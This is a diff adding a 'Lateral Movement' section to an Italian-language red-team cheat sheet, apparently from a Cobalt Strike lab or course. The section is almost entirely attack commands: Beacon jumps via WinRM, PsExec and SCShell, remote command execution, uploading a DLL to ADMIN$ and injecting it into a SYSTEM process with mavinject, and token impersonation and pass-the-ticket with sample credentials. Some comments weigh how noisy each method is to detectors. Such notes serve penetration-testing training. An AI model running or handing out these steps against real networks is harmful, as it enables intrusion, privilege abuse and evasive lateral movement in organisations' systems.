@@ -163,6 +163,8 @@ New-ItemProperty -Path "HKCU:...\InprocServer32" -Name "ThreadingModel" -Value "
 
 
 ```
+
+
 ## Post-Exploitation
 #ServicePath (sc_qc)
 #ServiceRegistry (powerpick)
@@ -851,3 +853,152 @@ Match (n:GPO) return n
 
 ```
 
+## Lateral Movement
+
+```bash
+#Assicurarsi che WinRM sia attivo e che il target accetti connessioni remote.
+Enable-PSRemoting -Force
+Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
+
+#Spostare beacon su host remoto
+jump winrm64 <target> smb
+
+
+#Usi jump per muoverti lateralmente verso il sistema lon-ws-1 usando WinRM (architettura 64-bit).
+beacon> jump winrm64 lon-ws-1 smb
+
+#Viene eseguito il comando net sessions su lon-ws-1 tramite WinRM.
+beacon> remote-exec winrm lon-ws-1 net sessions
+
+
+#esempi comandi
+remote-exec winrm lon-ws-1 whoami
+remote-exec winrm lon-ws-1 net user
+remote-exec winrm lon-ws-1 net sessions
+remote-exec winrm lon-ws-1 ipconfig /all
+##########################################
+#Esempio StepByStep
+# 1. Esegui beacon su host remoto via WinRM (fileless)
+jump winrm64 <target> smb
+
+# 2. Esegui comandi con output sul sistema remoto
+remote-exec winrm <target> <command>
+
+# Esempi:
+remote-exec winrm <target> whoami
+remote-exec winrm <target> net sessions
+remote-exec winrm <target> ipconfig /all
+
+##########################################
+
+#Usa Service Control Manager (SCM) per creare un servizio temporaneo sul sistema remoto (lon-ws-1
+beacon> jump psexec64 lon-ws-1 smb
+
+#Crea un servizio temporaneo e carica il beacon
+#Necessita accesso amministrativo al target (SMB/ADMIN$).
+#-->Usalo solo se accetti il rischio di rilevamento.
+beacon> jump psexec64 <target> smb
+
+
+##########################################
+# 1. Esegui beacon su host remoto usando Service Control Manager
+jump psexec64 <target> smb
+
+# Beacon eseguito come SYSTEM
+# Payload scritto in \\<target>\ADMIN$\xxxx.exe
+
+##########################################
+
+
+#SCS
+Cobalt Strike > Script Manager > Load: scshell.cna
+
+# Usa un servizio esistente per eseguire beacon.
+beacon> jump scshell64 <target> smb
+#Esempi
+jump scshell64 lon-ws-1 smb
+jump scshell64 10.10.120.10 smb
+
+#--> la migliore "rumorosità" è quella di WinRm64
+
+##########################################
+# 1. Carica Aggressor Script scshell.cna
+Cobalt Strike > Script Manager > Load > scshell.cna
+
+# 2. Esegui beacon su host remoto usando un servizio esistente modificato temporaneamente
+jump scshell64 <target> smb
+
+# Il servizio originale viene modificato, usato, e poi ripristinato.
+# Nessun nuovo servizio viene creato.
+##########################################
+
+#LOLBAS
+#Sono binari, script o librerie firmate da microsoft e preinstallate
+
+#Enumerare i processi remoti con WinRM
+beacon> remote-exec winrm <target> Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
+
+#esempio
+remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
+#questo identifica un processo ad esempio
+Id          : 1992
+ProcessName : spoolsv
+UserName    : NT AUTHORITY\SYSTEM
+
+#carico DLL sul sistema
+beacon> cd \\lon-ws-1\ADMIN$\System32
+beacon> upload C:\Payloads\smb_x64.dll
+
+#WMI per lanciare il file con la dll. In questo esempio si inietta smb_x64.dll nel processo con PID 1992.
+
+beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
+
+#Collego beacon nato dall'injection
+beacon> link lon-ws-1 TSVCPIPE-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+
+#Recap a step
+
+##########################################
+# 1. Trova processo remoto SYSTEM
+remote-exec winrm <target> Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
+
+# 2. Carica DLL
+cd \\<target>\ADMIN$\System32
+upload C:\Payloads\smb_x64.dll
+
+# 3. Inject via mavinject
+remote-exec wmi <target> mavinject.exe [PID] /INJECTRUNNING C:\Windows\System32\smb_x64.dll
+
+# 4. Collega beacon
+link <target> TSVCPIPE-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+##########################################
+
+
+#LogonType vs Autenticazione
+
+##########################################
+# 1. Muoviti lateralmente con WinRM o PsExec
+jump winrm64 lon-ws-1 smb
+
+# 2. Prova ad eseguire una query LDAP (PowerView)
+powershell-import PowerView.ps1
+powerpick Get-DomainTrust
+
+# 3. Il comando fallisce → manca un TGT nel beacon
+# Nessuna autenticazione LDAP possibile
+
+# 4. Verifica tipo di ticket presente
+kerberos_ticket_list
+
+# 5. Se hai solo HTTP/<host> → sei loggato come Network Logon (senza TGT)
+
+# 6. Soluzioni:
+make_token CONTOSO\admin password123
+# oppure
+ptt C:\Tickets\tgt_admin.kirbi
+
+# 7. Ritenta il comando:
+powerpick Get-DomainTrust
+##########################################
+
+```
